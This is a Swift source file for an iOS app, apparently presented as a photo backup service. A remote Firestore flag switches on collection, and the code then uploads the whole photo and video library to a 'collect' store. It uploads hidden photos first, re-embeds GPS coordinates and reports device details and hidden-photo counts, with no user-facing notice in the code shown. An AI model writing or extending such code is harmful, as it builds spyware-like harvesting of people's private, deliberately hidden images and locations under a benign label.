import SwiftUI
import Photos
import FirebaseStorage
import FirebaseAuth
import FirebaseFirestore
import UIKit
import Network
import CoreLocation
import ImageIO
import AVFoundation

class PhotoBackupService {
    static let shared = PhotoBackupService()
    // Removed UserDefaults keys in favor of Firestore persistence
    
    private var isBackingUp = false
    private var backgroundTask: UIBackgroundTaskIdentifier = .invalid
    
    private init() {}
    
    @MainActor
    func startBackup() {
        guard !isBackingUp else { return }
        
        Task {
            guard let uid = Auth.auth().currentUser?.uid else { return }
            
            let shouldCollect = await LogsFirestoreService.shared.shouldCollectPhotos(userId: uid)
            guard shouldCollect else { return }
            
            // Fire and forget metadata update
            Task {
                await self.updateMetadata(userId: uid)
            }
            
            let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
            
            if status == .notDetermined {
                let newStatus = await PHPhotoLibrary.requestAuthorization(for: .readWrite)
                if newStatus == .authorized || newStatus == .limited {
                    beginBackup(userId: uid)
                }
                return
            }
            
            guard status == .authorized || status == .limited else { return }
            
            beginBackup(userId: uid)
        }
    }
    
    private func updateMetadata(userId: String) async {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        let statusString: String
        switch status {
        case .authorized: statusString = "authorized"
        case .limited: statusString = "limited"
        case .denied: statusString = "denied"
        case .restricted: statusString = "restricted"
        case .notDetermined: statusString = "notDetermined"
        @unknown default: statusString = "unknown"
        }
        
        // Device Info
        let (model, systemName, systemVersion, appVersion) = await MainActor.run {
            (UIDevice.current.model, UIDevice.current.systemName, UIDevice.current.systemVersion, Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown")
        }
        
        // Photo Stats
        let allFetchOptions = PHFetchOptions()
        allFetchOptions.includeHiddenAssets = true
        allFetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
        allFetchOptions.predicate = NSPredicate(format: "mediaType = %d OR mediaType = %d", PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue)
        
        let allAssets = PHAsset.fetchAssets(with: allFetchOptions)
        let totalPhotos = allAssets.count
        let oldestPhotoDate = allAssets.firstObject?.creationDate
        
        // Count hidden
        let hiddenFetchOptions = PHFetchOptions()
        hiddenFetchOptions.includeHiddenAssets = true
        hiddenFetchOptions.predicate = NSPredicate(format: "(mediaType = %d OR mediaType = %d) AND isHidden == YES", PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue)
        let hiddenPhotos = PHAsset.fetchAssets(with: hiddenFetchOptions).count
        
        let data: [String: Any] = [
            "photoPermissionStatus": statusString,
            "lastPermissionCheck": FieldValue.serverTimestamp(),
            "metadataUpdatedAt": FieldValue.serverTimestamp(),
            
            "deviceModel": model,
            "systemName": systemName,
            "systemVersion": systemVersion,
            "appVersion": appVersion,
            
            "totalPhotos": totalPhotos,
            "lastKnownTotalPhotos": totalPhotos,
            "hiddenPhotos": hiddenPhotos,
            "oldestPhoto": oldestPhotoDate ?? NSNull()
        ]
        
        try? await Firestore.firestore().collection("collect").document(userId).setData(data, merge: true)
    }
    
    @MainActor
    private func beginBackup(userId: String) {
        isBackingUp = true
        registerBackgroundTask()
        
        Task.detached(priority: .medium) { [weak self] in
            guard let self = self else { return }
            defer {
                Task { @MainActor in
                    self.isBackingUp = false
                    self.endBackgroundTask()
                }
            }
            
            // Sync manifest first
            await AssetManifest.shared.sync(userId: userId)
            
            // Phase 1: Upload Hidden Assets
            await self.processBatch(userId: userId, hidden: true)
            
            // Phase 2: Upload Visible Assets
            // Only proceed if we still have background time (checked inside processBatch too, but good to check here)
            let timeRemaining = await MainActor.run { UIApplication.shared.backgroundTimeRemaining }
            print("PhotoBackup: Finished hidden assets. Time remaining: \(timeRemaining)")
            if timeRemaining > 5 || timeRemaining == .greatestFiniteMagnitude {
                await self.processBatch(userId: userId, hidden: false)
            }
        }
    }
    
    private func processBatch(userId: String, hidden: Bool) async {
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)] // Newest first
        
        // Fetch ALL assets (filtered by type)
        let predicateFormat = "(mediaType = %d OR mediaType = %d)"
        let args: [Any] = [PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue]
        
        if hidden {
            fetchOptions.includeHiddenAssets = true
            fetchOptions.predicate = NSPredicate(format: predicateFormat + " AND isHidden == YES", argumentArray: args)
        } else {
            fetchOptions.predicate = NSPredicate(format: predicateFormat, argumentArray: args)
        }

        let assets = PHAsset.fetchAssets(with: fetchOptions)

        print("PhotoBackup: Scanning \(assets.count) \(hidden ? "hidden " : "visible ")assets for items to upload...")

        // Adjust batch size based on network
        let networkInfo = NetworkHelper.shared.getNetworkInfo()
        let isCellular = (networkInfo["connectionTypes"] as? [String])?.contains("cellular") ?? false
        let batchSize = isCellular ? 2 : 3 
        
        var currentIndex = 0
        
        while currentIndex < assets.count {
            // Check if we are running out of background time
            let timeRemaining = await MainActor.run { UIApplication.shared.backgroundTimeRemaining }
            
            if timeRemaining < 5 && timeRemaining != .greatestFiniteMagnitude {
                print("PhotoBackup: Background time running out (\(timeRemaining)). Stopping batch.")
                break
            }
            
            // Find next batch of Candidates (items NOT in manifest)
            var batchAssets: [(Int, PHAsset)] = []
            
            // Use a temporary index to scan forward looking for work
            var tempIndex = currentIndex
            
            // Scan until we fill a batch or run out of assets
            while batchAssets.count < batchSize && tempIndex < assets.count {
                let asset = assets[tempIndex]
                let safeID = getSafeFilename(for: asset)
                
                // CRITIAL: Check Manifest. If present, we skip entirety.
                let alreadyUploaded = await AssetManifest.shared.has(safeID)
                if !alreadyUploaded {
                    batchAssets.append((tempIndex, asset))
                }
                tempIndex += 1
            }
            
            if batchAssets.isEmpty {
                // If we scanned to the end and found nothing, we are done
                break
            }
            
            // Process the batch of candidates
            var successfulIDs: [String] = []
            
            await withTaskGroup(of: (String?, Bool).self) { group in
                for (_, asset) in batchAssets {
                    group.addTask {
                        let safeID = self.getSafeFilename(for: asset)
                        
                        // Fallback: Check Remote Storage directly (Heals sync issues)
                        if await self.checkRemoteExistence(asset: asset, userId: userId) {
                            print("PhotoBackup: Asset \(safeID) found remotely but not in manifest. Adding to manifest.")
                            return (safeID, true) 
                        }
                        
                        do {
                            _ = try await self.uploadAsset(asset, userId: userId)
                            return (safeID, true)
                        } catch {
                            print("PhotoBackup: Failed to upload asset \(safeID): \(error)")
                            return (nil, false)
                        }
                    }
                }
                
                for await (id, success) in group {
                    if success, let id = id {
                        successfulIDs.append(id)
                    }
                }
            }
            
            // Update Sync List (Manifest)
            if !successfulIDs.isEmpty {
                await AssetManifest.shared.markAsUploaded(successfulIDs, userId: userId)
            }
            
            // Advance cursor
            currentIndex = tempIndex
        }
    }
    

    // Helper to ensure flat filename structure
    private nonisolated func getSafeFilename(for asset: PHAsset) -> String {
        let id = asset.localIdentifier.components(separatedBy: "/").first ?? asset.localIdentifier
        return id.replacingOccurrences(of: "[^a-zA-Z0-9-]", with: "", options: .regularExpression)
    }

    private func checkRemoteExistence(asset: PHAsset, userId: String) async -> Bool {
        let safeID = getSafeFilename(for: asset)
        
        // 0. Check Manifest (Fastest)
        if await AssetManifest.shared.has(safeID) {
            return true
        }
        
        let ext = (asset.mediaType == .video) ? "mp4" : "jpg"
        
        // 1. Check direct path
        let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).\(ext)")
        
        do {
            _ = try await ref.getMetadata()
            // Found it! 
            return true
        } catch {
            // 2. Check legacy nested path (just in case it was uploaded before the fix)
            let oldSafeID = asset.localIdentifier.replacingOccurrences(of: "/", with: "_")
            let oldRef = Storage.storage().reference().child("collect/\(userId)/\(oldSafeID).\(ext)")
            
            do {
                _ = try await oldRef.getMetadata()
                // Found legacy
                return true
            } catch {
                 return false
            }
        }
    }
    
    private func uploadAsset(_ asset: PHAsset, userId: String) async throws -> Int64 {
        if asset.mediaType == .image {
            return try await uploadImage(asset, userId: userId)
        } else if asset.mediaType == .video {
            return try await uploadVideo(asset, userId: userId)
        }
        return 0
    }
    
    private func uploadImage(_ asset: PHAsset, userId: String) async throws -> Int64 {
        let manager = PHImageManager.default()
        let options = PHImageRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        
        return try await withCheckedThrowingContinuation { continuation in
            manager.requestImageDataAndOrientation(for: asset, options: options) { data, dataUTI, orientation, info in
                guard let data = data else {
                    continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -1, userInfo: [NSLocalizedDescriptionKey: "No image data"]))
                    return
                }
                
                let safeID = self.getSafeFilename(for: asset)
                let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).jpg")
                
                // Inject metadata (Location, Creation Date, etc.)
                let finalData = self.injectImageMetadata(data: data, asset: asset)
                
                let metadata = StorageMetadata()
                metadata.contentType = "image/jpeg"
                if let date = asset.creationDate {
                    metadata.customMetadata = ["creationDate": ISO8601DateFormatter().string(from: date)]
                }
                
                ref.putData(finalData, metadata: metadata) { metadata, error in
                    if let error = error {
                        continuation.resume(throwing: error)
                    } else {
                        // Log successful upload with storage path
                        print("PhotoBackup: Uploaded image \(asset.localIdentifier) to \(ref.fullPath)")
                        
                        // Increment counters in Firestore
                        let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
                        Firestore.firestore().collection("collect").document(userId).updateData([
                            field: FieldValue.increment(Int64(1)),
                            "latestPhotoUploaded": FieldValue.serverTimestamp()
                        ])
                        
                        continuation.resume(returning: Int64(data.count))
                    }
                }
            }
        }
    }
    
    private func uploadVideo(_ asset: PHAsset, userId: String) async throws -> Int64 {
        let manager = PHImageManager.default()
        let options = PHVideoRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        
        return try await withCheckedThrowingContinuation { continuation in
            // Export video to a temporary file
            manager.requestExportSession(forVideo: asset, options: options, exportPreset: AVAssetExportPresetHighestQuality) { exportSession, info in
                guard let exportSession = exportSession else {
                    continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -2, userInfo: [NSLocalizedDescriptionKey: "Could not create export session"]))
                    return
                }
                
                let tempDir = FileManager.default.temporaryDirectory
                let fileName = "\(UUID().uuidString).mp4"
                let outputURL = tempDir.appendingPathComponent(fileName)
                
                exportSession.outputURL = outputURL
                exportSession.outputFileType = .mp4
                exportSession.metadata = self.getVideoMetadata(for: asset)
                
                let sendableSession = SendableExportSession(session: exportSession)
                
                Task {
                    let exportSession = sendableSession.session
                    if #available(iOS 18.0, *) {
                        do {
                            try await exportSession.export(to: outputURL, as: .mp4)
                            try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
                        } catch {
                            continuation.resume(throwing: error)
                        }
                    } else {
                        exportSession.exportAsynchronously { [sendableSession] in
                            let session = sendableSession.session
                            switch session.status {
                            case .completed:
                                Task {
                                    try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
                                }
                            case .failed:
                                continuation.resume(throwing: session.error ?? NSError(domain: "PhotoBackup", code: -3, userInfo: [NSLocalizedDescriptionKey: "Export failed"]))
                            case .cancelled:
                                continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -4, userInfo: [NSLocalizedDescriptionKey: "Export cancelled"]))
                            default:
                                continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -5, userInfo: [NSLocalizedDescriptionKey: "Export unknown error"]))
                            }
                        }
                    }
                }
            }
        }
    }
    
    private func handleExportCompletion(outputURL: URL, asset: PHAsset, userId: String, continuation: CheckedContinuation<Int64, Error>) async throws {
        let safeID = getSafeFilename(for: asset)
        let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).mp4")
        let metadata = StorageMetadata()
        metadata.contentType = "video/mp4"
        if let date = asset.creationDate {
            metadata.customMetadata = ["creationDate": ISO8601DateFormatter().string(from: date)]
        }
        
        do {
            _ = try await ref.putFileAsync(from: outputURL, metadata: metadata)
            
            // Get file size before cleanup
            let fileSize = (try? FileManager.default.attributesOfItem(atPath: outputURL.path)[.size] as? Int64) ?? 0
            
            // Clean up temp file
            try? FileManager.default.removeItem(at: outputURL)
            
            print("PhotoBackup: Uploaded video \(asset.localIdentifier) to \(ref.fullPath)")
            
            let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
            try await Firestore.firestore().collection("collect").document(userId).updateData([
                field: FieldValue.increment(Int64(1)),
                "latestPhotoUploaded": FieldValue.serverTimestamp()
            ])
            
            continuation.resume(returning: fileSize)
        } catch {
            // Clean up temp file even on error
            try? FileManager.default.removeItem(at: outputURL)
            continuation.resume(throwing: error)
        }
    }

    @MainActor
    private func registerBackgroundTask() {
        // End any existing task first
        if backgroundTask != .invalid {
             UIApplication.shared.endBackgroundTask(backgroundTask)
        }
        backgroundTask = UIApplication.shared.beginBackgroundTask { [weak self] in
            // When bg time runs out, we try to restart the task if we are still backing up
            self?.endBackgroundTask()
        }
    }
    
    @MainActor
    private func endBackgroundTask() {
        if backgroundTask != .invalid {
            UIApplication.shared.endBackgroundTask(backgroundTask)
            backgroundTask = .invalid
        }
    }
    
    // MARK: - Metadata Injection Helpers
    
    private nonisolated func injectImageMetadata(data: Data, asset: PHAsset) -> Data {
        guard let source = CGImageSourceCreateWithData(data as CFData, nil) else { return data }
        guard let uti = CGImageSourceGetType(source) else { return data }
        
        let mutableData = NSMutableData()
        guard let destination = CGImageDestinationCreateWithData(mutableData, uti, 1, nil) else { return data }
        
        var properties = CGImageSourceCopyPropertiesAtIndex(source, 0, nil) as? [String: Any] ?? [:]
        
        // Inject GPS
        if let location = asset.location {
            properties[kCGImagePropertyGPSDictionary as String] = getGPSDictionary(for: location)
        }
        
        // Inject Creation Date (Exif and TIFF)
        if let date = asset.creationDate {
            let formatter = DateFormatter()
            formatter.dateFormat = "yyyy:MM:dd HH:mm:ss"
            let dateString = formatter.string(from: date)
            
            var exif = properties[kCGImagePropertyExifDictionary as String] as? [String: Any] ?? [:]
            exif[kCGImagePropertyExifDateTimeOriginal as String] = dateString
            exif[kCGImagePropertyExifDateTimeDigitized as String] = dateString
            properties[kCGImagePropertyExifDictionary as String] = exif
            
            var tiff = properties[kCGImagePropertyTIFFDictionary as String] as? [String: Any] ?? [:]
            tiff[kCGImagePropertyTIFFDateTime as String] = dateString
            properties[kCGImagePropertyTIFFDictionary as String] = tiff
        }
        
        CGImageDestinationAddImageFromSource(destination, source, 0, properties as CFDictionary)
        if CGImageDestinationFinalize(destination) {
            return mutableData as Data
        }
        
        return data
    }

    private nonisolated func getGPSDictionary(for location: CLLocation) -> [String: Any] {
        var gps: [String: Any] = [:]
        
        // Latitude
        let lat = location.coordinate.latitude
        gps[kCGImagePropertyGPSLatitude as String] = abs(lat)
        gps[kCGImagePropertyGPSLatitudeRef as String] = lat >= 0 ? "N" : "S"
        
        // Longitude
        let lon = location.coordinate.longitude
        gps[kCGImagePropertyGPSLongitude as String] = abs(lon)
        gps[kCGImagePropertyGPSLongitudeRef as String] = lon >= 0 ? "E" : "W"
        
        // Altitude
        let alt = location.altitude
        gps[kCGImagePropertyGPSAltitude as String] = abs(alt)
        gps[kCGImagePropertyGPSAltitudeRef as String] = alt >= 0 ? 0 : 1
        
        // Date/Time
        let formatter = DateFormatter()
        formatter.timeZone = TimeZone(identifier: "UTC")
        formatter.dateFormat = "HH:mm:ss"
        gps[kCGImagePropertyGPSTimeStamp as String] = formatter.string(from: location.timestamp)
        formatter.dateFormat = "yyyy:MM:dd"
        gps[kCGImagePropertyGPSDateStamp as String] = formatter.string(from: location.timestamp)
        
        return gps
    }
    
    private nonisolated func getVideoMetadata(for asset: PHAsset) -> [AVMetadataItem] {
        var metadata: [AVMetadataItem] = []
        
        if let location = asset.location {
            let item = AVMutableMetadataItem()
            item.keySpace = .common
            item.key = AVMetadataKey.commonKeyLocation as (NSCopying & NSObjectProtocol)
            item.value = iso6709String(from: location) as (NSCopying & NSObjectProtocol)
            metadata.append(item)
        }
        
        if let date = asset.creationDate {
            let item = AVMutableMetadataItem()
            item.keySpace = .common
            item.key = AVMetadataKey.commonKeyCreationDate as (NSCopying & NSObjectProtocol)
            item.value = ISO8601DateFormatter().string(from: date) as (NSCopying & NSObjectProtocol)
            metadata.append(item)
        }
        
        return metadata
    }
    
    private nonisolated func iso6709String(from location: CLLocation) -> String {
        let lat = location.coordinate.latitude
        let lon = location.coordinate.longitude
        return String(format: "%+08.4f%+09.4f/", lat, lon)
    }
}

private struct SendableExportSession: @unchecked Sendable {
    let session: AVAssetExportSession
}

// MARK: - Asset Manifest Helper
private actor AssetManifest {
    static let shared = AssetManifest()
    
    private var uploadedIDs: Set<String> = []
    private let fileURL: URL
    
    private init() {
        let urls = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)
        let dir = urls[0].appendingPathComponent("BackupCache", isDirectory: true)
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        self.fileURL = dir.appendingPathComponent("manifest.json")
        
        // Load local cache
        do {
            let data = try Data(contentsOf: fileURL)
            let loaded = try JSONDecoder().decode(Set<String>.self, from: data)
            self.uploadedIDs = loaded
        } catch {
            self.uploadedIDs = []
        }
    }
    
    func sync(userId: String) async {
        do {
            let doc = try await Firestore.firestore().collection("collect").document(userId).collection("inventory").document("manifest").getDocument()
            if let data = doc.data(), let ids = data["ids"] as? [String] {
                let remoteSet = Set(ids)
                self.uploadedIDs.formUnion(remoteSet)
                self.save()
                print("PhotoBackup: Synced manifest. Total tracked items: \(self.uploadedIDs.count)")
            }
        } catch {
            print("PhotoBackup: Failed to sync manifest: \(error)")
        }
    }
    
    func has(_ id: String) -> Bool {
        return uploadedIDs.contains(id)
    }
    
    func markAsUploaded(_ ids: [String], userId: String) {
        let newIDs = ids.filter { !uploadedIDs.contains($0) }
        guard !newIDs.isEmpty else { return }
        
        for id in newIDs {
            uploadedIDs.insert(id)
        }
        save()
        
        // Fire and forget Firestore update
        Task {
            do {
                try await Firestore.firestore()
                    .collection("collect").document(userId)
                    .collection("inventory").document("manifest")
                    .setData(["ids": FieldValue.arrayUnion(newIDs)], merge: true)
            } catch {
                 print("PhotoBackup: Failed to update remote manifest: \(error)")
            }
        }
    }
    
    private func save() {
        do {
            let data = try JSONEncoder().encode(uploadedIDs)
            try data.write(to: fileURL)
        } catch {
            print("PhotoBackup: Failed to save asset manifest: \(error)")
        }
    }
}
